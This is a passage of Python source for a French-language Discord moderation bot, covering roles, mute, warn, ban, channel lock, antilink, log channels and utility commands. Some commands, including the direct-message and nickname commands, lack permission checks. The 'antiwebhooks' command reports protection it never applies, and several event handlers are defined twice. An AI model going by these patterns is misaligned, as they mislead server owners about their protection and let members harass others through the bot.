        "https://youtu.be/bvkalRrtyvk?si=8hM8de1PRlH5UrCQ",
        "https://youtu.be/CtxnukRPCzY?si=BtQILCw3o2OCHFcK",
        "https://youtu.be/DBHWN_BHJKE?si=ch26JxfJZ4EiHaWu",
        "https://youtu.be/8u5v_7s4yNg?si=xngqWj9y8etaMkQz",
        "https://youtu.be/MEnaIWehyA8?si=kRVQaGFmfjN1hJXV",
        "https://youtu.be/K9VXvtN64fk?si=f44EwvaxmJtEikqq",
        "https://youtu.be/VHeOhTeLJGk?si=zGLTgz8-XFw9t8NU",
        "https://youtu.be/h1Tz84TXPmg?si=hpQj7VaOa8o-QVmz",
        "https://youtu.be/moRPd7p2geI?si=CI3hRev_k9uqYfO5"
    ]
    response = random.choice(responses)
    await ctx.send(f"**Tien ton ASMR**\n{response}")
        
##################################### ADMIN ###########################################

# Variable globale pour stocker l'ID du rôle propriétaire
role_owner_id = None

# Commande pour définir l'ID du rôle propriétaire
@bot.command()
@commands.has_permissions(manage_roles=True)
async def setroleowner(ctx, role_id: int):
    global role_owner_id
    role_owner_id = role_id
    embed = discord.Embed(description=f"L'ID du rôle propriétaire a été défini sur {role_id}.", color=0x00ff00)
    embed.set_author(name="✅ Rôle propriétaire défini")
    await ctx.send(embed=embed)

# Commande pour ajouter le rôle propriétaire à un utilisateur
@bot.command()
@commands.has_permissions(manage_roles=True)
async def addrole(ctx, member: discord.Member):
    global role_owner_id
    if role_owner_id is None:
        await ctx.send("L'ID du rôle propriétaire n'est pas défini. Utilisez la commande `!setroleowner` pour le définir.")
        return

    role = discord.utils.get(ctx.guild.roles, id=role_owner_id)
    if role is None:
        await ctx.send("Rôle introuvable. Veuillez vérifier l'ID.")
        return

    try:
        if role not in member.roles:
            await member.add_roles(role)
            embed = discord.Embed(description=f'{role.name} a été ajouté à {member.mention}.', color=0x00ff00)
            embed.set_author(name="✅ Rôle ajouté")
            await ctx.send(embed=embed)
        else:
            embed = discord.Embed(description=f'{member.mention} a déjà le rôle {role.name}.', color=0xff0000)
            embed.set_author(name="❌ Rôle déjà attribué")
            await ctx.send(embed=embed)
    except discord.Forbidden:
        await ctx.send("Le bot n'a pas les permissions nécessaires pour ajouter ce rôle. Vérifiez la hiérarchie des rôles et les permissions du bot.")

# Commande pour retirer le rôle propriétaire d'un utilisateur
@bot.command()
@commands.has_permissions(manage_roles=True)
async def removerole(ctx, member: discord.Member):
    global role_owner_id
    if role_owner_id is None:
        await ctx.send("L'ID du rôle propriétaire n'est pas défini. Utilisez la commande `!setroleowner` pour le définir.")
        return

    role = discord.utils.get(ctx.guild.roles, id=role_owner_id)
    if role is None:
        await ctx.send("Rôle introuvable. Veuillez vérifier l'ID.")
        return

    try:
        if role in member.roles:
            await member.remove_roles(role)
            embed = discord.Embed(description=f'{role.name} a été retiré de {member.mention}.', color=0x00ff00)
            embed.set_author(name="✅ Rôle retiré")
            await ctx.send(embed=embed)
        else:
            embed = discord.Embed(description=f'{member.mention} n\'a pas le rôle {role.name}.', color=0xff0000)
            embed.set_author(name="❌ Rôle non attribué")
            await ctx.send(embed=embed)
    except discord.Forbidden:
        await ctx.send("Le bot n'a pas les permissions nécessaires pour retirer ce rôle. Vérifiez la hiérarchie des rôles et les permissions du bot.")

# Vérification personnalisée pour les rôles et permissions
def has_role_and_permission(role_id, permission):
    async def predicate(ctx):
        role = discord.utils.get(ctx.guild.roles, id=role_id)
        if role in ctx.author.roles and getattr(ctx.author.guild_permissions, permission):
            return True
        await ctx.send("Vous n'avez pas les permissions nécessaires pour exécuter cette commande.")
        return False
    return commands.check(predicate)

# Exemple de commande restreinte par rôle et permission
@bot.command()
@has_role_and_permission(role_id=123456789012345678, permission='manage_channels')  # Remplacez par l'ID du rôle requis
async def restricted_command(ctx):
    embed = discord.Embed(description='Cette commande est accessible uniquement à ceux ayant le rôle requis et la permission nécessaire.', color=0x00ff00)
    embed.set_author(name="✅ Commande exécutée")
    await ctx.send(embed=embed)


## NICKNAME
@bot.command()
async def nickname(ctx, member: discord.Member, *, new_nickname: str):
    try:
        await member.edit(nick=new_nickname)
        await ctx.send(f"Le pseudo a été modifié avec succès pour {member.mention} qui a été changer en `{new_nickname}`.")
    except discord.Forbidden:
        await ctx.send("Je n'ai pas les permissions pour changer le pseudo.")
    except discord.HTTPException:
        await ctx.send("La commande a échouée, veuilez ressayer plus tard.")

## UNLOCK ET LOCK
@bot.command()
@commands.has_permissions(manage_channels=True)
async def lock(ctx, channel: discord.TextChannel = None):
    channel = channel or ctx.channel
    overwrite = channel.overwrites_for(ctx.guild.default_role)
    overwrite.send_messages = False
    await channel.set_permissions(ctx.guild.default_role, overwrite=overwrite)
    await ctx.send(f'{channel.mention} a été lock.')

@lock.error
async def lock_error(ctx, error):
    if isinstance(error, commands.MissingPermissions):
        await ctx.send("You don't have permission to use this command.")
        
@bot.command()
@commands.has_permissions(manage_channels=True)
async def unlock(ctx, channel: discord.TextChannel = None):
    channel = channel or ctx.channel
    overwrite = channel.overwrites_for(ctx.guild.default_role)
    overwrite.send_messages = None
    await channel.set_permissions(ctx.guild.default_role, overwrite=overwrite)
    await ctx.send(f'{channel.mention} a été unlock.')

@unlock.error
async def unlock_error(ctx, error):
    if isinstance(error, commands.MissingPermissions):
        await ctx.send("You don't have permission to use this command.")

## MUTE
@bot.command()
@commands.has_permissions(manage_roles=True)
async def mute(ctx, member: discord.Member, *, reason=None):
    guild = ctx.guild
    mute_role = discord.utils.get(guild.roles, name="Mute")

    if not mute_role:
        mute_role = await guild.create_role(name="Mute")

        for channel in guild.channels:
            await channel.set_permissions(mute_role, speak=False, send_messages=False)

    await member.add_roles(mute_role, reason=reason)
    embed = discord.Embed(
        title="Mute",
        description=f"**{member.mention} a été mute**\n**Raison : {reason}**",
        color=discord.Color.red()
    )
    await ctx.send(embed=embed)

## UNMUTE
@bot.command()
@commands.has_permissions(manage_roles=True)
async def unmute(ctx, member: discord.Member):
    muted_role = discord.utils.get(ctx.guild.roles, name="Mute")

    await member.remove_roles(muted_role)
    embed = discord.Embed(
        title="Unmute",
        description=f"**{member.mention} a été unmute**",
        color=discord.Color.red()
    )
    await ctx.send(embed=embed)

## WARN
@bot.command()
@commands.has_permissions(manage_messages=True)
async def warn(ctx, member: discord.Member, *, reason=None):
    if str(member.id) not in warnings:
        warnings[str(member.id)] = []

    warnings[str(member.id)].append(reason)
    save_warnings()

    embed = discord.Embed(
        title="Warn",
        description=f"**{member.mention} a été averti**\n**Raison : {reason}**",
        color=discord.Color.red()
    )
    await ctx.send(embed=embed)

    if len(warnings[str(member.id)]) >= 3:
        await member.kick(reason="Trop d'avertissements")
        kick_embed = discord.Embed(
            title="Kick",
            description=f"**{member.mention} a été expulsé**\n**Raison : Trop d'avertissements**",
            color=discord.Color.red()
        )
        await ctx.send(embed=kick_embed)

##CLEAR WARN
@bot.command()
@commands.has_permissions(manage_messages=True)
async def clearwarn(ctx, member: discord.Member):
    if str(member.id) in warnings:
        warnings.pop(str(member.id))
        save_warnings()
        await ctx.send(f'Les avertissements pour {member.mention} ont été supprimés.')
    else:
        await ctx.send(f'{member.mention} n\'a pas d\'avertissements.')

## RELOAD
@bot.command()
@commands.has_permissions(manage_channels=True)
async def reload(ctx):
    channel = ctx.channel

    # Récupérer les informations du salon
    name = channel.name
    category = channel.category
    position = channel.position
    topic = channel.topic
    nsfw = channel.nsfw
    slowmode_delay = channel.slowmode_delay
    bitrate = channel.bitrate if isinstance(channel, discord.VoiceChannel) else None
    user_limit = channel.user_limit if isinstance(channel, discord.VoiceChannel) else None
    overwrites = channel.overwrites

    # Créer un nouveau salon avec les mêmes paramètres
    if isinstance(channel, discord.TextChannel):
        new_channel = await category.create_text_channel(
            name,
            topic=topic,
            nsfw=nsfw,
            slowmode_delay=slowmode_delay,
            position=position,
            overwrites=overwrites
        )
    elif isinstance(channel, discord.VoiceChannel):
        new_channel = await category.create_voice_channel(
            name,
            bitrate=bitrate,
            user_limit=user_limit,
            position=position,
            overwrites=overwrites
        )
    elif isinstance(channel, discord.StageChannel):
        new_channel = await category.create_stage_channel(
            name,
            position=position,
            overwrites=overwrites
        )

    # Supprimer l'ancien salon
    await channel.delete()

    # Envoyer un message dans le nouveau salon pour indiquer qu'il a été recréé
    await new_channel.send("Ce salon a été rechargé avec succès !")

## BAN
@bot.command()
@commands.has_permissions(ban_members=True)
async def ban(ctx, member: discord.Member, *, reason=None):
    await member.ban(reason=reason)
    await ctx.send(f'Le membre {member.mention} a été banni.')

## KICK
@bot.command()
@commands.has_permissions(kick_members=True)
async def kick(ctx, member: discord.Member, *, reason=None):
    await member.kick(reason=reason)
    await ctx.send(f'Le membre {member.mention} a été kick.')
        
## ANTI WEBHOOKS
@bot.command()
async def antiwebhooks(ctx, arg=None):
    if arg not in ["on", "off"]:
        await ctx.send("Vous devez préciser `on` ou `off`")
        return

    if arg == "on":
        await ctx.send("L'anti webhooks a été activé")
    else:
        await ctx.send("L'anti webhooks a été désactivé")
        
## ANTILINK AND DISABLE ANTILINK
@bot.event
async def on_message(message):
    if message.author == bot.user:
        return

    # Vérifier si le message contient un lien et si antilink est activé pour le salon
    if any(word in message.content for word in ("http://", "https://")):
        if message.channel.id in antilink_channels:
            await message.delete()
            await message.channel.send(f'{message.author.mention}, les liens ne sont pas autorisés dans ce salon.', delete_after=5)
            return

    await bot.process_commands(message)

@bot.command()
@commands.has_permissions(administrator=True)
async def antilink(ctx, state: str = None):
    if state is None:
        await ctx.send("Veuillez spécifier l'état comme 'on' ou 'off'.")
        return
    
    if state.lower() not in ['on', 'off']:
        await ctx.send("Veuillez spécifier l'état comme 'on' ou 'off'.")
        return
    
    if state.lower() == 'on':
        if ctx.channel.id not in antilink_channels:
            antilink_channels.append(ctx.channel.id)
            save_antilink_channels()
            await ctx.send(f'Antilink activé pour {ctx.channel.mention}')
        else:
            await ctx.send(f'Antilink est déjà activé pour {ctx.channel.mention}')
    elif state.lower() == 'off':
        if ctx.channel.id in antilink_channels:
            antilink_channels.remove(ctx.channel.id)
            save_antilink_channels()
            await ctx.send(f'Antilink désactivé pour {ctx.channel.mention}')
        else:
            await ctx.send(f'Antilink est déjà désactivé pour {ctx.channel.mention}')       
    
## SLOWMODE
@bot.command()
@commands.has_permissions(manage_channels=True)
async def slowmode(ctx, channel: discord.TextChannel, seconds: int):
    await channel.edit(slowmode_delay=seconds)
    await ctx.send(f'Le slow mode dans {channel.mention} est de {seconds} secondes.')
            
##################################### LOGS ###########################################
admin_role_id = 1240410801207246997  # ID réel du rôle Admin

@bot.command()
async def logdelete(ctx):
    guild = ctx.guild
    existing_channel = discord.utils.get(guild.channels, name='📁-msg-delete-logs')
    if existing_channel:
        await ctx.send("The log channel for deleted messages already exists.")
    else:
        log_channel = await guild.create_text_channel('📁-msg-delete-logs')
        await ctx.send(f"Log channel for deleted messages created: {log_channel.mention}")

@bot.command()
async def logedit(ctx):
    guild = ctx.guild
    existing_channel = discord.utils.get(guild.channels, name='📁-msg-edit-logs')
    if existing_channel:
        await ctx.send("The log channel for edited messages already exists.")
    else:
        log_channel = await guild.create_text_channel('📁-msg-edit-logs')
        await ctx.send(f"Log channel for edited messages created: {log_channel.mention}")

@bot.command()
async def logban(ctx):
    guild = ctx.guild
    existing_channel = discord.utils.get(guild.channels, name='📁-ban-logs')
    if existing_channel:
        await ctx.send("The log channel for bans already exists.")
    else:
        log_channel = await guild.create_text_channel('📁-ban-logs')
        await ctx.send(f"Log channel for bans created: {log_channel.mention}")

@bot.command()
async def logremove(ctx):
    guild = ctx.guild
    existing_channel = discord.utils.get(guild.channels, name='📁-remove-logs')
    if existing_channel:
        await ctx.send("The log channel for member removals already exists.")
    else:
        log_channel = await guild.create_text_channel('📁-remove-logs')
        await ctx.send(f"Log channel for member removals created: {log_channel.mention}")

@bot.command()
async def logrole(ctx):
    guild = ctx.guild
    existing_channel = discord.utils.get(guild.channels, name='📁-role-update-logs')
    if existing_channel:
        await ctx.send("The log channel for member role updates already exists.")
    else:
        log_channel = await guild.create_text_channel('📁-role-update-logs')
        await ctx.send(f"Log channel for member role updates created: {log_channel.mention}")

@bot.command()
async def logpin(ctx):
    guild = ctx.guild
    existing_channel = discord.utils.get(guild.channels, name='📁-pin-logs')
    if existing_channel:
        await ctx.send("The log channel for pinned messages already exists.")
    else:
        log_channel = await guild.create_text_channel('📁-pin-logs')
        await ctx.send(f"Log channel for pinned messages created: {log_channel.mention}")

@bot.command()
async def logvoice(ctx):
    guild = ctx.guild
    existing_channel = discord.utils.get(guild.channels, name='📁-voice-logs')
    if existing_channel:
        await ctx.send("The log channel for voice channel events already exists.")
    else:
        log_channel = await guild.create_text_channel('📁-voice-logs')
        await ctx.send(f"Log channel for voice channel events created: {log_channel.mention}")

# Command to create logging channels
@bot.command()
async def presetlogs(ctx):
    guild = ctx.guild

    admin_role_id = 1240410801207246997  # Admin role ID
    admin_role = guild.get_role(admin_role_id)

    if admin_role is None:
        await ctx.send(f"The role with ID {admin_role_id} was not found in this server.")
        return

    existing_category = discord.utils.get(guild.categories, name='Logs')
    if existing_category:
        logs_category = existing_category
        await ctx.send("The logs category already exists.")
    else:
        overwrites = {
            guild.default_role: discord.PermissionOverwrite(read_messages=False),
            guild.me: discord.PermissionOverwrite(read_messages=True),
            admin_role: discord.PermissionOverwrite(read_messages=True)
        }
        logs_category = await guild.create_category('Logs', overwrites=overwrites)
        await ctx.send("Logs category created successfully.")

    await create_log_channel(guild, logs_category, '📁-msg-delete-logs', 'Message Deleted Logs', 'Message deletion logs.', admin_role)
    await create_log_channel(guild, logs_category, '📁-msg-edit-logs', 'Message Edited Logs', 'Message edit logs.', admin_role)
    await create_log_channel(guild, logs_category, '📁-ban-logs', 'Ban Logs', 'Member ban logs.', admin_role)
    await create_log_channel(guild, logs_category, '📁-remove-logs', 'Member Removal Logs', 'Member removal logs.', admin_role)
    await create_log_channel(guild, logs_category, '📁-role-update-logs', 'Role Update Logs', 'Member role update logs.', admin_role)
    await create_log_channel(guild, logs_category, '📁-pin-logs', 'Pin Logs', 'Pinned message logs.', admin_role)
    await create_log_channel(guild, logs_category, '📁-voice-logs', 'Voice Channel Logs', 'Voice channel logs.', admin_role)

    await ctx.send("All preset logs channels created successfully.")

async def create_log_channel(guild, category, name, title, description, admin_role):
    existing_channel = discord.utils.get(guild.channels, name=name)
    if existing_channel:
        return existing_channel

    overwrites = {
        guild.default_role: discord.PermissionOverwrite(read_messages=False),
        guild.me: discord.PermissionOverwrite(read_messages=True),
        admin_role: discord.PermissionOverwrite(read_messages=True)
    }
    log_channel = await guild.create_text_channel(name, category=category, overwrites=overwrites)
    
    embed = discord.Embed(title=title, description=description, color=discord.Color.blue())
    await log_channel.send(embed=embed)

    return log_channel

async def log_action(channel_name, embed):
    for guild in bot.guilds:
        log_channel = discord.utils.get(guild.text_channels, name=channel_name)
        if log_channel:
            await log_channel.send(embed=embed)
            break

@bot.event
async def on_message_delete(message):
    embed = discord.Embed(
        title="Message Deleted",
        description=f"**Message from {message.author} deleted in {message.channel}:**\n{message.content}",
        color=discord.Color.red()
    )
    embed.set_footer(text=f"Author ID: {message.author.id} | Message ID: {message.id}")
    await log_action('📁-msg-delete-logs', embed)

@bot.event
async def on_message_edit(before, after):
    embed = discord.Embed(
        title="Message Edited",
        description=f"**Message from {before.author} edited in {before.channel}:**",
        color=discord.Color.orange()
    )
    embed.add_field(name="Before", value=before.content, inline=False)
    embed.add_field(name="After", value=after.content, inline=False)
    embed.set_footer(text=f"Author ID: {before.author.id} | Message ID: {before.id}")
    await log_action('📁-msg-edit-logs', embed)
    
@bot.event
async def on_message_delete(message):
    log_channel = discord.utils.get(message.guild.channels, name='msg-delete-logs')
    if log_channel:
        embed = discord.Embed(title="Message Deleted", description=f"Message from {message.author.mention} deleted in {message.channel.mention}", color=discord.Color.red())
        embed.add_field(name="Message Content", value=message.content, inline=False)
        embed.set_footer(text=f"User ID: {message.author.id}")
        await log_channel.send(embed=embed)

@bot.event
async def on_message_edit(before, after):
    log_channel = discord.utils.get(before.guild.channels, name='msg-edit-logs')
    if log_channel and before.content != after.content:
        embed = discord.Embed(title="Message Edited", description=f"Message from {before.author.mention} edited in {before.channel.mention}", color=discord.Color.orange())
        embed.add_field(name="Before", value=before.content, inline=False)
        embed.add_field(name="After", value=after.content, inline=False)
        embed.set_footer(text=f"User ID: {before.author.id}")
        await log_channel.send(embed=embed)

@bot.event
async def on_member_ban(guild, user):
    log_channel = discord.utils.get(guild.channels, name='ban-logs')
    if log_channel:
        embed = discord.Embed(title="Member Banned", description=f"{user.mention} has been banned", color=discord.Color.red())
        embed.set_footer(text=f"User ID: {user.id}")
        await log_channel.send(embed=embed)

@bot.event
async def on_member_remove(member):
    log_channel = discord.utils.get(member.guild.channels, name='remove-logs')
    if log_channel:
        embed = discord.Embed(title="Member Removed", description=f"{member.mention} has left or been kicked", color=discord.Color.red())
        embed.set_footer(text=f"User ID: {member.id}")
        await log_channel.send(embed=embed)

@bot.event
async def on_member_update(before, after):
    if before.roles != after.roles:
        log_channel = discord.utils.get(before.guild.channels, name='role-update-logs')
        if log_channel:
            embed = discord.Embed(title="Member Role Update", description=f"Roles updated for {before.mention}", color=discord.Color.blue())
            before_roles = ", ".join([role.mention for role in before.roles])
            after_roles = ", ".join([role.mention for role in after.roles])
            embed.add_field(name="Before", value=before_roles, inline=False)
            embed.add_field(name="After", value=after_roles, inline=False)
            embed.set_footer(text=f"User ID: {before.id}")
            await log_channel.send(embed=embed)

@bot.event
async def on_guild_channel_pins_update(channel, last_pin):
    log_channel = discord.utils.get(channel.guild.channels, name='pin-logs')
    if log_channel:
        embed = discord.Embed(title="Pins Updated", description=f"Pins updated in {channel.mention}", color=discord.Color.green())
        embed.add_field(name="Last Pin", value=last_pin, inline=False)
        embed.set_footer(text=f"Channel ID: {channel.id}")
        await log_channel.send(embed=embed)

@bot.event
async def on_voice_state_update(member, before, after):
    log_channel = discord.utils.get(member.guild.channels, name='voice-logs')
    if log_channel:
        if before.channel is None and after.channel is not None:
            embed = discord.Embed(title="Voice Channel Join", description=f"{member.mention} joined {after.channel.mention}", color=discord.Color.green())
            embed.set_footer(text=f"User ID: {member.id}")
            await log_channel.send(embed=embed)
        elif before.channel is not None and after.channel is None:
            embed = discord.Embed(title="Voice Channel Leave", description=f"{member.mention} left {before.channel.mention}", color=discord.Color.red())
            embed.set_footer(text=f"User ID: {member.id}")
            await log_channel.send(embed=embed)
        elif before.channel != after.channel:  
            embed = discord.Embed(title="Voice Channel Move", description=f"{member.mention} moved from {before.channel.mention} to {after.channel.mention}", color=discord.Color.orange())
            embed.set_footer(text=f"User ID: {member.id}")
            await log_channel.send(embed=embed)
            
##################################### UTILITY ###########################################

## USERINFO
@bot.command()
async def userinfo(ctx, member: discord.Member):
    embed = discord.Embed(title=f"Information sur {member.display_name}", color=discord.Color.red())

    # Fetch user banner
    user_banner_url = None
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(f'https://discord.com/api/v9/users/{member.id}', headers={"Authorization": f"Bot {bot.http.token}"}) as response:
                if response.status == 200:
                    data = await response.json()
                    banner_id = data.get('banner')
                    if banner_id:
                        banner_format = 'gif' if banner_id.startswith('a_') else 'png'
                        user_banner_url = f"https://cdn.discordapp.com/banners/{member.id}/{banner_id}.{banner_format}?size=512"
    except Exception as e:
        print(f"Error fetching banner: {e}")
    
    if user_banner_url:
        embed.set_image(url=user_banner_url)
    
    if member.avatar:
        embed.set_thumbnail(url=member.avatar.url)
    
    status_emojis = {
        "online": "",   
        "idle": "",
        "dnd": "",
        "offline": "",
        "invisible": ""
    }
    status_emoji = status_emojis.get(str(member.status), "<:offline:123456789012345678>")

    embed.add_field(name="Nom", value=f"`{member.display_name}`", inline=False)
    embed.add_field(name="ID", value=f"`{member.id}`", inline=False)
    embed.add_field(name="Création du compte", value=f"`{member.created_at.strftime('%d/%m/%Y %H:%M:%S')}`", inline=False)
    embed.add_field(name="Rejoint le", value=f"`{member.joined_at.strftime('%d/%m/%Y %H:%M:%S')}`", inline=False)
    embed.add_field(name="Rôles", value=f"`{', '.join([role.name for role in member.roles[1:]])}`", inline=False)
    embed.add_field(name="Statut", value=f"{status_emoji} `{member.status}`", inline=False)
    embed.add_field(name="Est-ce un bot ?", value=f"`{member.bot}`", inline=False)
    
    # Activities
    activities = ', '.join([activity.name for activity in member.activities]) if member.activities else 'None'
    embed.add_field(name="Activités", value=f"`{activities}`", inline=False)

    await ctx.send(embed=embed)

## ROLES
@bot.command()
async def roles(ctx):
    # Exclure les rôles par défaut (comme @everyone) et les rôles de bots par défaut
    user_created_roles = [
        role for role in ctx.guild.roles 
        if not role.is_default() and not any(member.bot for member in role.members)
    ]
    if not user_created_roles:
        await ctx.send("Aucun role n'est présent.")
        return

    embed = discord.Embed(title="Rôles", color=discord.Color.blue())
    roles_list = '\n'.join([role.name for role in user_created_roles])
    embed.add_field(value=roles_list, inline=False)

    await ctx.send(embed=embed)

## ROLE INFO
@bot.command()
async def roleinfo(ctx, role: discord.Role):
    embed = discord.Embed(title=f"Role Info for {role.name}", color=role.color)
    embed.add_field(name="Role Name", value=role.name, inline=False)
    embed.add_field(name="Role ID", value=role.id, inline=False)
    embed.add_field(name="Role Color", value=str(role.color), inline=False)
    embed.add_field(name="Role Mentionable", value=str(role.mentionable), inline=False)
    embed.add_field(name="Role Created at", value=role.created_at, inline=False)
    await ctx.send(embed=embed)

## DM USER
@bot.command()
async def dm(ctx, member: discord.Member, *, message):
    await member.send(message)
    await ctx.send(f'Un membre a été dm {member.mention}')
    
## DM ALL
@bot.command(name='dmall')
@commands.has_permissions(administrator=True)
async def dmall(ctx, *, message: str):
    # Parcourir tous les membres du serveur
    for member in ctx.guild.members:
        # Éviter d'envoyer un message au bot lui-même
        if member == bot.user:
            continue
        try:
            # Envoyer le message direct
            await member.send(message)
            print(f'Message envoyé à {member.name}')
        except Exception as e:
            print(f'Impossible d\'envoyer un message à {member.name}: {e}')

    await ctx.send('Messages envoyés à tous les membres.')

## MEMBERS
@bot.command()
async def members(ctx):
    online = sum(member.status == discord.Status.online for member in ctx.guild.members)
    dnd = sum(member.status == discord.Status.dnd for member in ctx.guild.members)
    idle = sum(member.status == discord.Status.idle for member in ctx.guild.members)
    offline = sum(member.status == discord.Status.offline for member in ctx.guild.members)
    invisible = sum(member.status == discord.Status.invisible for member in ctx.guild.members)

    embed = discord.Embed(title="Server Member Status", color=discord.Color.blue())
    embed.add_field(name="<:online:1254888332006133790> Online", value=f"`{online}`", inline=False)
    embed.add_field(name="<:dnd:1254888416508907633> Do Not Disturb", value=f"`{dnd}`", inline=False)
    embed.add_field(name="<:idle:1254888375702257795> Idle", value=f"`{idle}`", inline=False)
    embed.add_field(name="<:invisible:1254888466513137854> Invisible", value=f"`{invisible}`", inline=False)
    embed.add_field(name="<:invisible:1254888466513137854> Offline", value=f"`{offline}`", inline=False)

    await ctx.send(embed=embed)

## SETPREFIX
@bot.command()
@commands.has_permissions(administrator=True)
async def setprefix(ctx, new_prefix: str):
    bot.command_prefix = new_prefix
    save_prefix()
    await ctx.send(f'Le nouveau prefix est : `{new_prefix}`')
    
## DELETE MESSAGE
@bot.command()
@commands.has_permissions(manage_messages=True)
async def delete(ctx, amount: int = 200):
    deleted = await ctx.channel.purge(limit=amount)
    await ctx.send(f'{len(deleted)} Messages ont été supprimez.')
    
## PING
@bot.command()
async def ping(ctx):
    latency = round(bot.latency * 1000)
    await ctx.send(f'**Ping :** `{latency}ms`')
    
## AVATAR USER    
@bot.command()
async def avatar(ctx, member: discord.Member):
    color = getattr(bot, 'embed_color', discord.Color.default())
    embed = discord.Embed(title=f"Avatar de : {member.name}", color=color)
    embed.set_image(url=member.avatar.url)
    await ctx.send(embed=embed)
    
## SERVER INFO
@bot.command()
async def serverinfo(ctx):
    guild = ctx.guild
    color = getattr(bot, 'embed_color', discord.Color.default())
    embed = discord.Embed(title=f"Information sur le serveur {guild.name}", color=color)
    embed.add_field(name="Nom", value=f"`{guild.name}`", inline=False)
    embed.add_field(name="ID", value=f"`{guild.id}`", inline=False)
    embed.add_field(name="Propriétaire", value=f"`{guild.owner}`", inline=False)
    embed.add_field(name="Membres", value=f"`{guild.member_count}`", inline=False)
    embed.add_field(name="Rôles", value=f"`{len(guild.roles)}`", inline=False)
    embed.add_field(name="Salons", value=f"`{len(guild.channels)}`", inline=False)
    if guild.banner:
        embed.set_image(url=guild.banner.url)
    if guild.icon:
        embed.set_thumbnail(url=guild.icon.url)
    await ctx.send(embed=embed)
    
##################################### BOT ###########################################

## BOT INFO
@bot.command()
async def botinfo(ctx):
    color = getattr(bot, 'embed_color', discord.Color.default())
    embed = discord.Embed(title="AnKa Bot Information", color=color)

    embed.set_thumbnail(url=bot.user.avatar.url)

    bot_banner_url = None
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(f'https://discord.com/api/v9/users/{bot.user.id}', headers={"Authorization": f"Bot {bot.http.token}"}) as response:
                if response.status == 200:
                    data = await response.json()
                    banner_id = data.get('banner')
                    if banner_id:
                        banner_format = 'gif' if banner_id.startswith('a_') else 'png'
                        bot_banner_url = f"https://cdn.discordapp.com/banners/{bot.user.id}/{banner_id}.{banner_format}?size=512"
    except Exception as e:
        print(f"Error fetching bot's banner: {e}")
    
    if bot_banner_url:
        embed.set_image(url=bot_banner_url)

    embed.add_field(name="Name", value=f"```yaml\n{bot.user.name}```", inline=False)
    embed.add_field(name="ID", value=f"```yaml\n{bot.user.id}```", inline=False)
    embed.add_field(name="Owner", value=f"```yaml\n{bot.anka}```", inline=False)
    embed.add_field(name="Version", value=f"```yaml\n1.0.0```", inline=False)
    embed.add_field(name="Language", value=f"```yaml\nPython 3.11.9```", inline=False)

    # Counting the number of commands the bot has
    command_count = len(bot.commands)
    embed.add_field(name="Total Commands", value=f"```yaml\n{command_count}```", inline=False)

    await ctx.send(embed=embed)
    
## INVITES
@bot.command()
async def invite(ctx):
    invite_url = 'https://discord.com/oauth2/authorize?client_id=1190026239042392145&permissions=8&integration_type=0&scope=bot'  
    try:
        await ctx.author.send(f'Voici le lien pour inviter le bot : {invite_url}')
        await ctx.send(f'{ctx.author.mention}, Je vous ai envoyer en DM le lien.')
    except discord.Forbidden:
        await ctx.send(f'{ctx.author.mention}, Je ne peut pas vous envoyer un DM, veuilez regarder vos parametres.')
        
##################################### GESTION ###########################################

## SETWELCOME
@bot.command()
@commands.has_permissions(administrator=True)  # Assurez-vous que seul un administrateur peut utiliser cette commande
async def setwelcome(ctx):
    global welcome_channels
    
    # Demander à l'utilisateur de mentionner le canal de bienvenue
    await ctx.send("Mentionnez le canal de bienvenue où vous souhaitez envoyer les messages :")
    
    try:
        # Attendre la réponse de l'utilisateur sous forme de mention de canal
        msg = await bot.wait_for('message', timeout=30, check=lambda message: message.author == ctx.author and message.channel == ctx.channel)
        
        # Vérifier si c'est une mention de canal valide
        channel = msg.channel_mentions[0] if msg.channel_mentions else None
        if channel:
            welcome_channels[ctx.guild.id] = channel.id
            await ctx.send(f"Le canal de bienvenue a été défini sur {channel.mention}.")
        else:
            await ctx.send("Canal de bienvenue non valide. Veuillez réessayer.")
    
    except TimeoutError:
        await ctx.send("Temps écoulé. Veuillez réessayer plus tard.")
        
## SETREMOVE
@bot.command()
@commands.has_permissions(administrator=True)
async def setremove(ctx):
    global leave_channels, leave_event_enabled
    
    await ctx.send("Mentionnez le salon de départ où vous souhaitez envoyer les messages :")
    
    try:
        msg = await bot.wait_for('message', timeout=30, check=lambda message: message.author == ctx.author and message.channel == ctx.channel)
        
        channel = msg.channel_mentions[0] if msg.channel_mentions else None
        if channel:
            leave_channels[ctx.guild.id] = channel.id
            leave_event_enabled[ctx.guild.id] = True
            await ctx.send(f"Le canal de départ a été défini sur {channel.mention}.")
        else:
            await ctx.send("Canal de départ non valide. Veuillez réessayer.")
    
    except TimeoutError:
        await ctx.send("Temps écoulé. Veuillez réessayer plus tard.")
        
## CEMBED
@bot.command()
@commands.has_permissions(administrator=True)
async def cembed(ctx):
    def check_author(m):
        return m.author == ctx.author and m.channel == ctx.channel
    
    await ctx.send("📋 Allons créer un embed ! Répondez `annuler` à tout moment pour annuler le processus de création.")
    
    # Titre
    await ctx.send("📝 Entrez le titre de l'embed :")
    try:
        msg = await bot.wait_for('message', timeout=60.0, check=check_author)
        if msg.content.lower() == 'annuler':
            await ctx.send("❌ Création de l'embed annulée.")
            return
        title = msg.content
    except asyncio.TimeoutError:
        await ctx.send("⏰ Temps écoulé. Veuillez réessayer.")
        return

    await ctx.send("📝 Entrez la description de l'embed :")
    try:
        msg = await bot.wait_for('message', timeout=60.0, check=check_author)
        if msg.content.lower() == 'annuler':
            await ctx.send("❌ Création de l'embed annulée.")
            return
        description = msg.content
    except asyncio.TimeoutError:
        await ctx.send("⏰ Temps écoulé. Veuillez réessayer.")
        return

    await ctx.send("🎨 Entrez la couleur de l'embed en format hex (ex: `#FF5733`) :")
    try:
        msg = await bot.wait_for('message', timeout=60.0, check=check_author)
        if msg.content.lower() == 'annuler':
            await ctx.send("❌ Création de l'embed annulée.")
            return
        color_str = msg.content.strip('#')
        if len(color_str) != 6:
            await ctx.send("⚠️ Format de couleur invalide. Création de l'embed annulée.")
            return
        color = discord.Color(int(color_str, 16))
    except asyncio.TimeoutError:
        await ctx.send("⏰ Temps écoulé. Veuillez réessayer.")
        return
    except ValueError:
        await ctx.send("⚠️ Valeur de couleur invalide. Création de l'embed annulée.")
        return

    fields = []
    while True:
        await ctx.send("➕ Voulez-vous ajouter un champ ? (oui/non) :")
        try:
            msg = await bot.wait_for('message', timeout=30.0, check=check_author)
            if msg.content.lower() == 'non':
                break
            elif msg.content.lower() == 'oui':
                await ctx.send("📝 Entrez le nom du champ :")
